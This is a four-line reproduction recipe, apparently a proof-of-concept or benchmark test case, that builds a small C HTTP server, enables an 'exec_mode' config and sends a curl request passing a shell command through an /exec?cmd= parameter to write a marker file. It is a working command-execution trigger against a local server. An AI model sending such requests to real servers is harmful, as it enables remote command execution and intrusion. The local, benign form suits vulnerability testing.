  build:   gcc -o httpd httpd.c -lpthread
  config:  printf 'exec_mode = 1\nexec_logging = 1\n' > /tmp/e.conf
  start:   cd /tmp/www && ./httpd --port 18125 --config /tmp/e.conf
  trigger: curl 'http://127.0.0.1:18125/exec?cmd=id>/tmp/poc_125_marker'
